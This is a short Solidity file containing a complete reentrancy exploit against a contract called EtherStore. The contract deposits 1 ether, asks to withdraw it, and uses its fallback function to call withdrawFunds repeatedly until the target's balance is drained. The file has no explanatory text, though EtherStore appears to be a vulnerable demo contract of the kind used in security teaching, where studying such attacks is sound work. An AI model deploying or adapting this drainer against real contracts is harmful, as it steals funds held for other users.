pragma solidity ^0.4.24;

import "./EtherStore.sol";

contract Attack {
    EtherStore public etherStore;

    constructor (address _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore () public payable {
        require(msg.value >= 1 ether);

        etherStore.depositFunds.value(1 ether)();
        etherStore.withdrawFunds(1 ether);
    }

    function () public payable {
        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
